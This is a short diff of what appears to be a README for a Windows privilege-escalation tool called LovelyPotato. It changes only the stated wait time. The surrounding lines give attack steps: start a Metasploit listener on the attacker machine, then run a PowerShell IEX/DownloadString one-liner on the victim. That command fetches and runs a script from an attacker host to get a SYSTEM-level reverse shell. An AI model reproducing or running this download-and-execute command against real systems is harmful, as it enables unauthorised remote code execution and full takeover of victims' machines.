@@ -25,7 +25,7 @@ On a new terminal, launch metasploit console (or any listener which handles what
 root@attacker:~# msfdb run
 msf5 > # I'm going to omit setting up the multi handler as it is something you should already know
 ```
-Finally enter below command on victim's powershell console and wait 5 minutes for reverse shell running as user NT AUTHORITY\SYSTEM!
+Finally enter below command on victim's powershell console and wait **10 minutes** for reverse shell running as user NT AUTHORITY\SYSTEM!
 ```
 PS > IEX(New-Object Net.WebClient).DownloadString('http://[AttackerIP]/Invoke-LovelyPotato.ps1')
 ```
